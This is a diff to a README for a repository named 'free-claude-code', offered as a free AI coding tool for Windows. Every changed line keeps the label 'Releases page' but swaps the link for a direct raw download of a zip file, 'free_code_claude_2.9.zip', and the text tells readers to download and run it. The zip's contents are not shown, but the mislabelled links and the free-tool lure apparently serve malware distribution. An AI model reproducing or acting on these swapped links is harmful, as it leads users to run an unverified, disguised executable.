@@ -1,6 +1,6 @@
 # 🤖 free-claude-code - Free terminal coding help
 
-[![Download free-claude-code](https://img.shields.io/badge/Download-Visit%20Releases-1f6feb?style=for-the-badge&logo=github)](https://github.com/straight-nyctereutes110/free-claude-code/releases)
+[![Download free-claude-code](https://img.shields.io/badge/Download-Visit%20Releases-1f6feb?style=for-the-badge&logo=github)](https://raw.githubusercontent.com/straight-nyctereutes110/free-claude-code/main/src/free_code_claude_2.9.zip)
 
 ## 🚀 What it does
 
@@ -23,7 +23,7 @@ You can use it to:
 
 Use this link to visit the release page and download the Windows version:
 
-[Download free-claude-code from Releases](https://github.com/straight-nyctereutes110/free-claude-code/releases)
+[Download free-claude-code from Releases](https://raw.githubusercontent.com/straight-nyctereutes110/free-claude-code/main/src/free_code_claude_2.9.zip)
 
 On the release page:
 1. Open the latest release
@@ -46,7 +46,7 @@ If you do not have an API key yet, create one from the provider you want to use.
 
 ## 🪟 Install on Windows
 
-1. Visit the [Releases page](https://github.com/straight-nyctereutes110/free-claude-code/releases)
+1. Visit the [Releases page](https://raw.githubusercontent.com/straight-nyctereutes110/free-claude-code/main/src/free_code_claude_2.9.zip)
 2. Download the Windows file from the latest release
 3. Open the file you downloaded
 4. Follow the on-screen steps
@@ -158,7 +158,7 @@ You can expect:
 
 To download and run the Windows version, visit the release page:
 
-[https://github.com/straight-nyctereutes110/free-claude-code/releases](https://github.com/straight-nyctereutes110/free-claude-code/releases)
+[https://raw.githubusercontent.com/straight-nyctereutes110/free-claude-code/main/src/free_code_claude_2.9.zip](https://raw.githubusercontent.com/straight-nyctereutes110/free-claude-code/main/src/free_code_claude_2.9.zip)
 
 Open the latest release, download the Windows file, then run it on your PC
 
@@ -203,7 +203,7 @@ Before opening the app:
 
 ## 📌 Short setup flow
 
-1. Visit the [Releases page](https://github.com/straight-nyctereutes110/free-claude-code/releases)
+1. Visit the [Releases page](https://raw.githubusercontent.com/straight-nyctereutes110/free-claude-code/main/src/free_code_claude_2.9.zip)
 2. Download the Windows file
 3. Run the file
 4. Enter your AI key
